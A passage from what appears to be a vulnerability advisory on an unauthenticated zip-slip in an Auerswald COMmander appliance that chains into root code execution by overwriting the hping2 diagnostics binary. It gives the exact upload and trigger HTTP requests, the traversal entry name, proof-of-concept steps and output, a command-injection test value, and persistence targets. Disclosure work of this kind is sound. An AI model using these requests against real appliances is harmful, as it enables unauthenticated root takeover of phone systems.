`/opt/auerswald/hping2`, `/opt/auerswald/hping2 -2`, `/opt/auerswald/hping2 -1`, ` -I `. Running it
unauthenticated produced an `execve` of `/bin/sh -c` with `hping2` in the string. At that point it
looked like a hardened, non-injectable diagnostics sink — the whitelist demonstrably works — and it
was recorded as such. It only became the second half of an RCE once a *file-write* primitive
existed elsewhere, because the sink's command names a constant path to a writable-by-root file.

### Sink Identification — the vulnerable construction

Two constructions, one per hop.

The vulnerable extraction (hop 1), reproduced verbatim from the emulator's syscall trace during a
live unauthenticated request:

```text
1430368 execve("../minizip/miniunz",
               {"../minizip/miniunz", "-o", "-x",
                "/data/provisioning/import/sliph.zip", "-d", "/data/provisioning/import/", NULL}) = 1430368
```

The extract directory is `/data/provisioning/import/`; the entry name is attacker-controlled and
uninspected; the effective uid of the process is 0. `-o` removes the only safety net a stock
`miniunz` has left (it will not otherwise overwrite). Entry names beginning `../` are resolved
against the `-d` directory by the ordinary path resolution of `fopen(dir + entry, "wb")`, which is
the classic zip-slip construction: the concatenation is trusted, the containment is assumed.

The vulnerable consumption (hop 2), also verbatim:

```text
1430381 execve("/bin/sh", {"sh", "-c",
                "/opt/auerswald/hping2 -1 -I eth0  -c 3 127.0.0.1 -p 0", NULL}) = 247
```

Note what is attacker-controlled here: nothing in the string. The target argument `127.0.0.1` came
from our request and passed the whitelist legitimately; the protocol selected `-1` (ICMP); the port
was `0`. The attack is entirely in the file that the constant path points to. This is the shape of
defect that a command-injection review will never find, because the command string is
irreproachable.

### Sink Identification — execution identity of the child process

`uid 0`, established three independent ways:

1. Structurally: `busybox init` runs `::respawn:/opt/auerswald/scripts/run-webserver` as root, the
   script performs no privilege change, and the binary contains no `setuid`, `seteuid`, `setgid`,
   `initgroups` or `chroot` call (one `prctl` reference in the whole 3.5 MB binary, unrelated to
   privilege). `webserver` therefore *is* root, and every child it spawns inherits that.
2. Observationally: the marker file written by the payload read
   `uid=0(root) gid=0(root) groups=0(root)`, and the payload's stdout echoed back in the HTTP
   response body read `<token>:uid=0:user=root`. That is the child reporting its own identity,
   not our inference about it.
3. By the ownership and mode of files the chain created: root-owned, mode 0666 for new files,
   original mode preserved for truncated files, on non-tmpfs storage under `/data/log` and
   `/opt/auerswald/minizip/`.

There is no privilege boundary between the web application and the operating system on this
appliance — that is a design fact about the product (zero suid binaries exist because none are
needed by a root webserver), and it is why hop 1's file write is immediately a root primitive
rather than a stepping stone.

### Sink Identification — the ABI dividing line between injectable and non-injectable call sites

This is the single most useful hardening lesson in the advisory, and the vendor should treat it as
an internal invariant worth writing down.

Of the five `posix_spawn` wrappers, exactly one produces a shell invocation:
`auer_systemf_insecure` at `0x2247f0`. The other four pass an argv array straight to
`posix_spawn`, so no shell ever parses their arguments — no metacharacter expansion, no quoting
rules, no glob, no command separation. The name is accurate: the one that is unsafe is labelled
insecure, and the 39 call sites of the argv variant plus the `systemv` variant are structurally
immune to injection.

Practical consequence for anyone auditing this class of product: before deciding whether a site is
injectable, determine which wrapper it goes through. Neither the function name nor the log string
tells you — every wrapper logs `run shell cmd: %s`, so a reviewer reading logs or strings sees
"shell" everywhere and will both over-report (assuming injection where argv is used) and
under-report (assuming a site is safe because its parameters look validated). In this product three
tempting sites — a `mv`, a `minizip` archive creation and a `mount -t squashfs` — were each first
suspected and then disproved precisely because they go through the argv form or a table-driven
parameter. Conversely, the sites that genuinely run a shell (`netdiagnostic_execute`, the
packet-capture streaming handler, `backupdata_export_cfg`, `languages_save`) are the ones that
needed parameter auditing, and in every case their parameters turned out to be whitelisted,
constant or table-derived.

The hardening recommendation that follows is not "add escaping". It is: **shrink the shell family
to zero**, and where a shell is genuinely needed, make it structurally impossible for a
root-consumed file path to appear as a constant inside a shell string — resolve such tools through
a read-only location or verify their digest before invocation.

### Sink Identification — sibling sinks, and whether they are proven

Proven siblings of hop 1 (same extractor helper `0xedf60`, same missing containment): the second
caller `0x948b8`, `auerweb_page_provisioning_downloadConfigurator`. It invokes the identical
`miniunz -o -x -d` form, so the containment defect is shared by construction. We did not build a
second exploit through it, and we do not claim one; we note it because a fix confined to
`0x96400` would leave the same extractor reachable from another route.

Considered and **disproved** — recorded so nobody re-walks the path:

- `auerweb_mini_zip` at `0xedfcc`, whose template is
  `cd %s; find * %s-type f -print0 | xargs -0 %s/%s -o %s/%s ` and which references both
  `../minizip/miniunz` and `-o -x -d`. A shell pipeline with five format slots looks like the best
  sink in the binary. It is dead code, on three independent tests: the linear instruction sweep
  found zero `bl`/`blx` to `0xedfcc`; a full-section 4-byte-aligned word scan found no word equal to
  `0xedfcc` (the same method found the live handlers, so the method self-validates); and the symbol
  is absent from both the 750-entry route table and the `.rodata` prefix table. Do not confuse it
  with `0xedf60`, which is live and is our sink.
- `faxupload` (AccessLevel 0) reaches `_auer_systemf_async` at `0x1963d4` in the call graph, but
  that function's commands are constant (`touch /data/etc/auerproxy_client.active`, `rm -f <pidfile>`),
  and the handler itself uses a shared-memory path. Transfer-reachable, not taint-reachable.
- `serverconfig_ip_save` -> `auer_getIpParamsFromDhcpServer` at `0x235ecc`, which formats
  `/opt/auerswald/udhcpc -tnf -i eth0 -h "%s" -s /opt/auerswald/dhcpc.script 2>&1` — a hostname
  inside double quotes, the classic injectable shape. It never fires from HTTP: four request bodies
  produced four traces with zero `execve`, and the format slot is filled from a module-private
  static global (`0x3638d0`) referenced only inside `auer_dhcpdiscover.c`, not from a request
  dictionary.
- `backupdata_export_cfg` (AccessLevel 2) does run `exec tar -cz -C ../../.. %s %s %s %s %s %s`
  through the shell family, and we confirmed the `execve` unauthenticated; all six slots resolve to
  compile-time constants, so it is not injectable. Its real defect is disclosure, not execution, and
  it is listed separately in section 12.
- `anlagenuhrzeit_setDateTime` reaches the argv wrapper with the fixed command `hwclock -w -u`; no
  slot, and the trace showed no `execve` at all.
- SQL-injection-to-code-execution is unavailable: the product embeds SQLite with
  `sqlite3_vmprintf` / `prepare_v2` / `bind_text` all present, `web_auth` carries a `'` -> `''`
  escaping constant, there is no `sqlite3_load_extension` in the imports, and the `asql.c`
  console-style helpers are not registered as HTTP routes. Even a successful injection has no
  bridge to a filesystem write or a command.

## 6. Source Identification

### Source Identification — the tainted input and its transport

The tainted input is the byte content of one `multipart/form-data` part in a POST to
`/provisioning_data_import`. Two distinct pieces of that request matter, and they are sanitised
differently — which is the whole story of this section:

| piece of the request | where it goes | sanitised? |
|---|---|---|
| `h_ulfilename=<name>` query parameter | becomes the on-disk basename under `/data/provisioning/import/` | **yes** — lowercase, `basename`, metacharacters mapped to `_`. Five traversal spellings were all stripped |
| `provDeviceId=<int>` query parameter | device selector in the handler | n/a for this chain |
| the multipart **part name** | must equal the filename for the parser to accept the body | not sanitised; it is a contract requirement |
| the multipart **part body** (archive bytes) | written verbatim to `/data/provisioning/import/<basename>`, then handed to `miniunz` | **no** |
| the **entry names inside that archive** | resolved against the `-d` directory by `fopen` inside the extractor | **no — this is the vulnerability** |

Traversal attempts against the *parameter* layer behaved exactly as a good sanitizer should:

```text
h_ulfilename=../../../etc/hosts          -> access("/data/provisioning/import/hosts")
h_ulfilename=....//....//....//etc/hosts -> access("/data/provisioning/import/hosts")
h_ulfilename=../benign.zip               -> access("/data/provisioning/import/benign.zip")
h_ulfilename=/etc/hosts                  -> access("/data/provisioning/import/hosts")
h_ulfilename=..%2f..%2fetc%2fhosts       -> access("/data/provisioning/import/hosts")
```

Because that layer is clean, an auditor who tests the parameter and stops will conclude the import
is safe. The traversal that matters is inside the archive, where no sanitizer of any kind runs.

### Source Identification — the body contract recovered from the vendor client

The request that works is unusual, and we document it verbatim because three earlier attempts at
this same chain failed for exactly this reason and looked like a protective filter rejecting our
upload.

The vendor's own static JavaScript shipped in the image gives the contract for free:

```javascript
/* /opt/auerswald/web/statics/script/parameter.js:1 and auerswald.js:12996 */
KEY_UPLOAD_PARAMETER = "h_ulfilename"

/* /opt/auerswald/web/statics/script/page_provisioning_dateiverwaltung.js:5 */
importpath = "/provisioning_data_import?" + KEY_UPLOAD_PARAMETER + "="

/* /opt/auerswald/web/statics/script/page_import_redir.js:15, Import.prototype.upload */
e = b._path.endsWith("h_ulfilename=") ? ""+b._path+encodeURIComponent(a.name) : b._path;
/*  ... e += "&provDeviceId=" + <select>.value; */
var f = new FormData;
f.append(a.name, a);          /* the multipart PART NAME is the file name itself */
b._uploadXHR = new UploadRequest(e, {method:"POST", postBody:f, ...});

/* page_import_redir.js:11, UploadRequest.setRequestHeaders */
X-Requested-With: XMLHttpRequest
```

The decisive line is `f.append(a.name, a)`. The browser API's first argument is the *field name*,
and the vendor passes the file's name there. So the multipart body carries one part whose
`name="slip.zip"` and `filename="slip.zip"` are identical strings. Requests built the conventional
way — `name="file"`, or `name="h_ulfilename"` — are rejected by the application's own multipart
parser, and the failure mode (an HTTP error with no diagnostic, and no file appearing on disk) is
indistinguishable from "the server filters uploads" unless you go and read the client.

The full contract, as our client implements it:

```http
POST /provisioning_data_import?h_ulfilename=<encodeURIComponent(name)>&provDeviceId=0 HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=<boundary>
X-Requested-With: XMLHttpRequest

--<boundary>
Content-Disposition: form-data; name="<name>"; filename="<name>"
Content-Type: application/octet-stream

<archive bytes>
--<boundary>--
```

A related correction worth recording for the vendor's benefit: an earlier hypothesis in our own
work was that the lighttpd configuration was not spooling request bodies to `server.upload-dirs`
and that this, not the part name, explained the rejections. That hypothesis was wrong.
`mod_fastcgi` forwards the request body to the backend over the FastCGI `STDIN` stream whether or
not it spools to disk, and the application parses that stream itself (the parser is visible in
strings as `web_socketRead`, with diagnostics including `no closing boundary found` and
`status=%i web_socketRead=0`). Once the part name matched the filename, the application stored our
bytes correctly on the first attempt. Nothing about the web server configuration was blocking the
upload, and a fix that adds `server.upload-dirs` would not have changed anything.

### Source Identification — sanitization that exists, and what it is for

Three sanitizers exist and all three do their job within their scope:

1. The filename sanitizer family around `0xf67a4` / `0xf4240`: lowercase, `basename`,
   metacharacter to `_`. Scope: HTTP filename parameters (`h_ulfilename`, `newFileName`). Purpose:
   stop path traversal and metacharacter injection arriving in a URL parameter. Effectiveness:
   confirmed by the five spellings above and by the two observed renames
   (`a;touch PWNED_EXP1` -> `a_touch pwned_exp1`, `../../data/log/MARKER_C5` -> `marker_c5`).
2. The diagnostics character whitelist at `0x87d8c`, the literal
   `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:/`, plus a three-value protocol
   enumeration. Scope: `commandLineUrl`, `commandLineProtokoll`. Purpose: stop command injection in
   a sink that runs `/bin/sh -c`. Effectiveness: confirmed — `;` and a backtick each caused the
   entire parameter to be rejected with `netdiagnostic - error: 1 Ping: kein Ziel angegeben` and
   no `execve` in the trace.
3. lighttpd's `url.access-deny = ("~", ".inc")` and `server.dir-listing = "disable"`. Scope:
   static file serving. Purpose: avoid exposing editor backups and directory indexes.

Notice the common property: every one of them sanitises a *string parameter*. The archive entry
names are not a string parameter of the web application — they are data inside a file the
application has already accepted and stored, consumed by a *different program* (`miniunz`) in a
*different process*, whose own view of "the file name" is whatever is in the central directory. No
component in the chain has the concept "entry name" in its threat model, so no component
validates it. This is the canonical reason zip-slip survives in codebases that have otherwise
done their input-validation homework.

### Source Identification — validation that is absent

Everything below is absent, and any one of them would have stopped this chain:

- No normalisation of archive entry names before extraction. No `realpath` containment check
  against the `-d` directory. No rejection of `..` components. No rejection of absolute entry
  names. No rejection of symlink entries.
- No destination allowlist. A provisioning import for this product needs to produce phone
  configuration templates; the set of legitimate entry names is small and known
  (`/opt/auerswald/provisioning/*_template.{xml,cfg}` and friends are visible as constants in the
  binary), and nothing enforces that the archive contains only those.
- No overwrite protection at the extractor level beyond what `-o` explicitly disables. The handler
  passes `-o`, which is the one flag that converts "refuse to clobber" into "clobber silently".
- No protection of executable paths. Writing to `/opt/**`, `/bin/**`, `/sbin/**` or `/etc/**` from
  an unauthenticated upload is not treated as an error condition anywhere in the chain.
- No post-extraction integrity check. The handler moves extracted files into `/data/provisioning/`
  and removes the import directory; nothing notices that a file appeared outside both.
- No archive format or type validation on the import route (the CWE-434 dimension). The route
  accepts whatever part bytes are sent and hands them to the extractor; a non-archive body simply
  fails extraction with error 8021.
- No authorization on the route, per section 3, so no compensating control exists at the front door
  either.

## 7. Data Flow

### Data Flow — end-to-end chain

```text
attacker host
  |
  |  HTTP request 1: multipart POST, part name == filename == "<name>.zip"
  |  query: h_ulfilename=<name>.zip & provDeviceId=0
  |  header: X-Requested-With: XMLHttpRequest
  v
lighttpd 1.4.64 (vendor ARM build, privilege dropped to "web" for the static layer only)
  |  mod_fastcgi: whole request body forwarded over the FastCGI STDIN stream
  |  fastcgi.server catch-all "/" -> env.fastcgi_socket, check-local=disable
  v
AF_UNIX  /tmp/webs_fcgi.socket      (in this rootfs, tmp is a symlink to /data/tmp)
  v
webserver  (uid 0, no privilege drop)
  |  route table .data 0x35950c..0x365c84 -> "provisioning_data_import", AccessLevel 2
  |  handler stub 0x96818 (192 B) tail-jumps to FUNC 0x96400 (1048 B)
  |  gate web_auth 0x15958 / web_checkAccess 0xf5d68: NOT consulted for this route family
  |  application multipart parser (web_socketRead) accepts the part
  |  sanitize(h_ulfilename) -> basename, lowercase, metacharacters to "_"
  v
write: /data/provisioning/import/<basename>            <- attacker bytes at rest, root-owned
  |  access(<dir>/<basename>, F_OK) == 0
  |  FUNC 0xedf60 -> bl 0x225168 (_auer_systemf_returncode, argv form, no shell)
  v
execve("../minizip/miniunz", {"../minizip/miniunz","-o","-x",
        "/data/provisioning/import/<basename>","-d","/data/provisioning/import/",NULL})   [uid 0]
  |  per entry: fopen(extract_dir + entry_name, "wb")     <- entry_name uninspected
  v
write: /opt/auerswald/hping2  = 256 bytes of "#!/bin/sh ..." text, mode 0755 preserved
        (truncation of an existing file: original mode bits survive)
  |  extracted files then moved to /data/provisioning/; import directory rmdir'd
  |  HTTP response: 200  {"fields": [],"errors": [],"warnings": []}
  v
attacker host
  |
  |  HTTP request 2: POST /netdiagnostic_execute
  |  body: commandLineUrl=127.0.0.1 & commandLineProtokoll=icmp & commandLinePort=0
  v
webserver (uid 0), route "netdiagnostic_execute", AccessLevel 2, handler FUNC 0x87d8c, site 0x880c4
  |  whitelist applied to commandLineUrl   -> "127.0.0.1" passes legitimately
  |  protocol enumeration                  -> "icmp" selects "-1"
  |  binary path is a compile-time constant -> /opt/auerswald/hping2
  v
execve("/bin/sh", {"sh","-c","/opt/auerswald/hping2 -1 -I eth0  -c 3 127.0.0.1 -p 0",NULL})  [uid 0]
  |  kernel reads the shebang of the file we wrote -> /bin/sh runs our script
  v
attacker script executes as uid 0(root) gid 0(root) groups 0(root)
  |  echoes "<token>:uid=0:user=root" to stdout; appends a marker file under /data/log
  v
stdout captured by the diagnostics handler -> HTTP response body   (not blind)
```

Every arrow in that diagram was observed, not derived: the two `execve` lines come from the
emulator's syscall trace of the product's own processes; the on-disk artefacts were inspected on
the host side of the extracted tree; the response bodies were captured from the HTTP exchange; and
the marker file content was read back after the run.

### Data Flow — properties of the chain worth naming

- **It is two requests, not a sequence of stages.** There is no polling, no callback, no
  second-stage download, no dropped implant fetched from the network. Both requests are ordinary
  management-plane POSTs that a legitimate administrator's browser also sends.
- **It is not blind.** The payload's stdout returns in the HTTP response body of request 2. An
  operator does not need a listener, which removes the biggest practical obstacle to reliable
  exploitation and to detection-by-canary alike.
- **It is stateless and idempotent.** Request 1 can be replayed; request 2 can be replayed. The
  overwrite persists on flash storage until something restores the binary, so an attacker can
  perform hop 1 minutes, hours or days before hop 2 — the two halves need not be temporally
  adjacent, which matters for detection tuning.
- **It is a two-hop chain over one root cause family, and both hops are needed.** The write
  primitive alone is already a serious integrity failure (an unauthenticated attacker can create or
  truncate root-owned files anywhere on the filesystem), but it is not code execution on its own
  without a consumer; the diagnostics route alone is a hardened, non-injectable sink. We treat
  them as one finding because they are one causal chain in one product, and we do not double-count
  the write primitive as a separate vulnerability.
- **The write primitive is strictly stronger than what we used it for.** We demonstrated three
  landing sites (`/data/log`, a second path resolving to the same directory from a deeper
  traversal, and `/opt/auerswald/minizip/`) and one executable overwrite. Alternatives that use the
  same primitive and need no second hop of their own — overwriting `/opt/auerswald/scripts/run-*`
  for reboot-surviving persistence, overwriting lighttpd configuration, or overwriting content in
  the web document root — are statically available. We did not fire them and do not claim them as
  demonstrated.
- **No log evidence is produced on the authorization side.** Because no session check runs, there
  is no failed-login event, no privilege-change record and no 401 anywhere in this chain. The
  application's own logging of the exec'd command line (`run shell cmd: %s`) would record the
  diagnostics command, which looks entirely normal, since the command string *is* normal.

## 8. Exploit Construction

### Exploit Construction — step sequence

The proof of concept in `exploit/auerswald_commander_provisioning_zip_slip_binary_hijack_root_rce.py`
performs the following, using only the Python standard library:

1. Generate a run-unique marker token. Build a `#!/bin/sh` payload that echoes
   `<token>:uid=$(id -u):user=$(id -un)` to stdout — that stdout is what the diagnostics handler
   returns in the HTTP body — and appends the output of `id` plus a caller-chosen command to
   `<marker-dir>/MARKER_<token>`, then exits 0 with status zero so the consuming handler sees a
   successful diagnostics run.
2. Build a zip containing that payload under the entry name
   `../../../opt/auerswald/hping2`, plus two innocuous entries (`benign.xml` and a uniqueness file)
   so the archive resembles a provisioning payload and the handler's post-extraction move step has
   something legitimate to work with.
3. Emit the multipart request exactly as the vendor client does: query string
   `?h_ulfilename=<name>&provDeviceId=0`, one part whose `name` and `filename` are both `<name>`,
   and the `X-Requested-With: XMLHttpRequest` header. Read the response and require HTTP 200 and
   the vendor success document `{"fields": [],"errors": [],"warnings": []}`.
4. Emit the trigger: `POST /netdiagnostic_execute` with a urlencoded body
   `commandLineUrl=<ip>&commandLineProtokoll=icmp&commandLinePort=0`. Every one of those values is
   a CLI argument, and the defaults are loopback-safe.
5. Scan the response body for a line containing the token. If found and it contains `:uid=0:`,
   report root code execution confirmed remotely. If found without `uid=0`, report that the payload
   ran at a different identity and point at the marker file. If not found, report that the token is
   absent from the body and that the payload may still have executed, and print the marker path to
   check — exit codes distinguish these three outcomes.
6. Print the exact on-device restore command line for `--restore`.

The script's other two modes are described below under the negative control and in section 9.

### Exploit Construction — payload engineering constraints

- **Traversal depth is fixed by the extract directory.** The extractor is invoked with
  `-d /data/provisioning/import/`. Reaching the filesystem root therefore takes exactly three
  `../` components: `import` -> `provisioning` -> `data` -> `/`. A payload written for a different
  product with a different import directory needs a different depth; we made it a CLI argument
  rather than a constant for that reason.
- **The target must be an existing executable, or you must supply a permission primitive.** New
  files created by the slip land mode 0666, which is not executable (no `x` bit for anyone). Files
  that already exist are truncated and keep their mode. So the practical target set for direct code
  execution is existing mode-07xx files consumed by root. `/opt/auerswald/hping2` (mode 0755) is in
  that set and is reachable by an unauthenticated trigger in the same request chain. Shell scripts
  consumed by root also qualify regardless of execute-bit subtleties, since the interpreter is named
  by the consumer.
- **Keep it small and text.** The payload we used is 256 bytes of shell text. A binary payload
  would work too — the write is a plain truncation — but text keeps the artefact inspectable and
  makes the shebang mechanism the only thing standing between the write and execution.
- **Exit 0 and echo on stdout.** The diagnostics handler captures the child's stdout into the
  response body, and exiting successfully keeps the response shape identical to a genuine
  diagnostics run. A crashing payload would still execute but would leave an obviously malformed
  response behind.
- **Do not fight the whitelist.** `commandLineUrl` is validated against the charset
  `0-9A-Za-z.-:/` and `commandLineProtokoll` against `tcp|udp|icmp`. Send a legitimate value in
  both. Attacking them is unnecessary and was disproved separately.
- **Request-body size ceiling.** `server.max-request-size = 150000` in the shipped lighttpd
  configuration bounds the archive. Our archives are a few hundred bytes. A larger payload would
  need to respect that ceiling (or target a listener whose configuration raises it).
- **Field-size headroom is generous.** `server.max-request-field-size = 65536` and the vendor's
  deliberate acceptance of bare `%` in URLs mean the header and query layer is not a constraint.

### Exploit Construction — target selection doctrine, including the approach that failed

This is the part of the work that is easiest to get wrong and that we document most fully, because
it is a reproduction trap.

The elegant approach is self-triggering: the slip executes inside the extractor, so overwrite the
extractor itself (`/opt/auerswald/minizip/miniunz`) and let the *next* import request execute your
payload. One request, one sink, no second hop. It does not work, and the failure is instructive:

```text
attempt: archive entry "../../../opt/auerswald/minizip/miniunz" = shell payload
result:  the target file ends up ZERO BYTES (digest prefix d41d8cd, the MD5 of an empty file)
next import request:
         execve("../minizip/miniunz", ...) fails, errno = 8 (ENOEXEC)
         the kernel's shebang fallback then tries
         execve("/bin/sh", {"../minizip/miniunz", ...}) which also fails on an empty file
```

The mechanism: the slip write happens *inside the currently executing `miniunz` process*, and
writing to a file that is currently exec-mapped for the running process fails. The truncation
already happened (the file is zero length) but the payload bytes never landed. The failure mode is
the `ETXTBSY` family; we did not instrument it further because it has no bearing on
exploitability — it is a target-selection constraint, not a mitigation. **The doctrine that
follows: never overwrite a binary that is executing the write.**

The working alternatives, both rooted in "pick an idle root-consumed file":

- **An idle binary triggered inside the same chain** — `/opt/auerswald/hping2`, which is not
  running during the import and which the unauthenticated diagnostics route executes moments later.
  Verified: full content landed, mode 0755 preserved, digest changed from
  `afc33cdf96b060e636c463e622b6ae1b` to a value recorded as beginning `e56536a5`, size 256 bytes.
  This is what the published proof of concept uses.
- **An init-respawned service script** — anything under `/opt/auerswald/scripts/run-*`, which busybox
  init respawns and which runs as root with no privilege drop. Overwriting one of those survives
  reboot and re-executes on restart, i.e. persistence. Statically available via the same primitive;
  not fired during verification.
- Also statically available and deliberately unused: lighttpd configuration files (note that
  `server.username` only lowers the static layer, so the FastCGI backend stays root either way),
  the web document root (phishing and watering-hole placement rather than execution), and
  `/bin/busybox` — which we specifically advise against, because PID 1 is `busybox init` and an
  exec-mapped write to it carries the same hazard class as the `miniunz` attempt, with far worse
  consequences for the appliance.

### Exploit Construction — what the exploit deliberately does not do

- It does not damage the appliance. The payload writes one marker file and restores nothing else;
  no configuration, database, certificate or log file is modified.
- It does not install persistence, does not create accounts, does not modify the init system, and
  does not touch the telnet facility that exists behind the AccessLevel 6 route.
- It does not read or exfiltrate the configuration database, the user certificates under
  `/data/certs/user-certs`, the provisioning templates, or any credential material — even though
  the achieved identity could.
- It does not use the separate unauthenticated packet-capture route, so no on-path network position
  is required or implied by this chain.
- It does not attack a physical device by default: host, port and scheme are CLI arguments, the
  default host is `127.0.0.1`, and `--control` and `--restore` exist so that a legitimate operator
  can validate and then undo the test on their own appliance.
- It ships no working offensive payload beyond the marker script used during verification, and no
  obfuscation of any kind.

## 9. Dynamic Verification

### Dynamic Verification — environment

```text
host            x86_64 Linux, network-namespaced, loopback-only listener
rootfs source   8_6D_000_COMmander60xx.rom (md5 0ba0ffbfa56bab00e7d12a4cb0b8fcd4, 60,719,362 B)
                -> gzip -> uImage (magic 0x27051956) -> ext2 at offset 588
                -> volume label 8.6D_000_128154., UUID c47a4c1a-38f6-4ed5-bb07-03ba5da54d9b
                -> debugfs rdump (e2fsprogs 1.47.0) -> 160 MB / 7030 files
/data           initialised by the vendor's own data-setup (konfig9.db, 105 tables)
isolation       unshare -n -m --propagation private, then chroot into the rootfs
application     the shipped webserver, started as root under qemu-arm-static
                (-d strace -D /data/log/ws.trace), so every execve is recorded
web server      the shipped ARM lighttpd 1.4.64, started in the outer namespace with
                QEMU_LD_PREFIX and the guest LD_LIBRARY_PATH, bound to a loopback-only
                host port, bridging the AF_UNIX FastCGI socket
configuration   the vendor's own http-parseopts (url-ctrls-reject => disable) and the vendor's
                fastcgi semantics (check-local=disable, x-sendfile=enable, fix-root-scriptname=enable);
                two directives added to our minimal lighttpd config during verification
                (server.upload-dirs, server.stream-request-body) - harness detail, not a product change
binaries        UNMODIFIED vendor webserver, lighttpd 1.4.64, miniunz
                (md5 36eb80de5ac55a8bbfc31e77c1d10e3d, 63,260 B, mode 0755), hping2
                (md5 afc33cdf96b060e636c463e622b6ae1b, 74,376 B, mode 0755)
changes made    none to authentication, routing or the sink; the configuration-database change in
                the tightened-state run was a TIGHTENING (a non-empty password hash), never a relaxation
cleanup         both hijacked binaries restored and re-verified by digest; the database restored and
                its digest re-verified; all emulator and web-server processes terminated; the
                loopback port closed; host load back to 0.00
```

### Dynamic Verification — the triggering request

Request 1, as sent (host and port redacted to placeholders because our instance listened on a
loopback-only port; the proof of concept takes both as arguments):

```http
POST /provisioning_data_import?h_ulfilename=<name>.zip&provDeviceId=0 HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=<boundary>
X-Requested-With: XMLHttpRequest
Content-Length: <len>

--<boundary>
Content-Disposition: form-data; name="<name>.zip"; filename="<name>.zip"
Content-Type: application/octet-stream

PK<...>  archive with entry  ../../../opt/auerswald/hping2  = 256 B "#!/bin/sh" script
--<boundary>--
```

Request 2:

```http
POST /netdiagnostic_execute HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

commandLineUrl=127.0.0.1&commandLineProtokoll=icmp&commandLinePort=0
```

No cookie header appeared in either request. No `Authorization` header. No session identifier of
any kind was presented at any point in the run, including the tightened-configuration run.

### Dynamic Verification — observed output

The proof-of-concept transcript from a successful run, with the run-unique token redacted as
`<token>` and the target rendered as a placeholder:

```text
[*] Target: http://<target>
[*] Product: Auerswald COMmander 6000/6000R 8.6D (webserver runs as uid 0, no privdrop)
[*] Auth: NONE (unauthenticated)  |  Token: <token>
[*] STAGE 1/3: multipart POST /provisioning_data_import?h_ulfilename=<name>.zip&provDeviceId=0
             (part name==filename==<name>.zip, 448 bytes)
[*]   payload entry: '../../../opt/auerswald/hping2'  (223 bytes) -> overwrites root 0755 binary hping2
[*]   HTTP 200  body={"fields": [],"errors": [],"warnings": []}
[+] Stage 1 accepted: root arbitrary file write via miniunz zip-slip delivered.
[*] STAGE 2/3: POST /netdiagnostic_execute (root sh -c exec's /opt/auerswald/hping2 = our payload)
[*]   HTTP 200  body(first 300)=<token>:uid=0:user=root |
[*] STAGE 3/3: verifying ROOT code execution from netdiagnostic response body
[+] RCE CONFIRMED (remote, out-of-band-free): <token>:uid=0:user=root
[+] PRIVILEGE = ROOT (uid=0). Unauthenticated root code execution achieved.
[*] Command output was also written to /data/log/MARKER_<token> on the target.
[*] cmd was: id; uname -a; hostname
[+] Done.
```

Target-side artefacts, read back from the extracted rootfs on the host side after the run:

```text
/data/log/MARKER_RCE_R4
    === MARKER_RCE_R4 (hping2 hijack) ===
    argv=-1 -I eth0 -c 3 127.0.0.1 -p 0
    uid=0(root) gid=0(root) groups=0(root)
    uid_inline=0 user=root
    /opt/auerswald/web

/opt/auerswald/RCE_PROOF_R4.txt
    PWNED_ROOT_R4 uid=0
```

Two independent non-tmpfs locations were used on purpose: `/data/log` and `/opt/auerswald`. A
marker in a temporary filesystem would not survive the import handler's `rmdir` of the import
directory or a reboot, and would prove less.

The marker from the scripted run also recorded the output of `id; uname -a; hostname`; its `uname`
line carried the emulation host's kernel string with an `armv7l` machine field, which is one of the
observable signatures of the user-mode emulation boundary described in section 1 and is the reason
we state that boundary rather than implying a physical appliance.

The write primitive was demonstrated independently of the hijack, with four unauthenticated
requests (all HTTP 200) whose archive entries landed here:

| archive entry name | landed path | owner | mode | storage |
|---|---|---|---|---|
| `../../log/<marker A>` | `/data/log/<marker A>` | root | 0666 | non-tmpfs |
| `../../../../data/log/<marker B>` | `/data/log/<marker B>` | root | 0666 | non-tmpfs |
| `../../../opt/auerswald/minizip/<marker C>` | `/opt/auerswald/minizip/<marker C>` | root | 0666 | non-tmpfs, under `/opt` |
| benign archive containing a uniqueness string | `/data/provisioning/benign.xml` | root | — | proves attacker bytes reach the filesystem intact |

Marker basenames carried a run-unique tag in the actual runs; the tag is redacted here and the
paths are otherwise exact. The uniqueness-string round trip is what proves end-to-end byte
delivery through the application's own multipart parser: a distinctive string placed inside a
benign archive was later found, intact, in the extracted file at the path the handler documents.

### Dynamic Verification — the negative control and why it matters

A negative control was run with a benign archive (no traversal entry, only `benign.xml` and a
uniqueness file) followed by the same benign diagnostics request, against the pristine `hping2`.
Result: no marker file created anywhere in the tree, and no proof token in the response body. The
control was executed twice — once before the overwrite and once after the original binary was put
back — and both times produced a clean result.

It matters for a specific reason. The trigger route `/netdiagnostic_execute` is itself
unauthenticated and does execute a root child process. Without a control, a reader could reasonably
suspect that the marker came from the diagnostics route rather than from the overwrite, i.e. that
we had demonstrated an unauthenticated command execution we had misattributed. The control removes
that reading: with the pristine binary in place, the identical trigger produces the genuine
`hping2` output and nothing else.

A second control covers the authorization claim rather than the execution claim: throughout every
round, `daemontools_state` (AccessLevel 6), `servicetools_state` (AccessLevel 4) and
`servicetrace.pcap` (AccessLevel 4) returned **401** to cookie-less requests, while `about_state`
(AccessLevel 0) returned 200. This control set was re-checked at the end of each round and after
the tightened-configuration change. It rules out the most damaging alternative explanation for our
200s — that the testbed had an authorization layer that was globally disabled or stubbed. Had it
been, all four routes would have answered 200.

### Dynamic Verification — the four-quadrant diagonal cross

The two controls above were arranged as a diagonal cross over two independent variables: the
archive content (slip vs benign) and the state of the consumed binary (pristine/hijacked vs
restored). Four measurements were taken, one per quadrant, each as its own request pair rather than
inferred from the others.

| quadrant | archive | binary state at trigger time | observed | what it rules out |
|---|---|---|---|---|
| Q1 | benign (`benign.xml` + uniqueness string, no traversal entry) | pristine `/opt/auerswald/hping2` | both requests 200; response body carries genuine `hping2` output; **no marker anywhere**; recorded clean as `CONTROL_CLEAN` | that the diagnostics route by itself produces our marker, i.e. that we misattributed a plain unauthenticated execution to the overwrite |
| Q2 | slip (entry `../../../opt/auerswald/hping2`) | pristine at import time | 200 with the vendor success document; payload bytes land at the target path (size 256, mode 0755 preserved, digest changed); **no execution yet** | that the import alone yields code execution - a consumer is required, which is why this is a two-hop chain and not a single-request RCE |
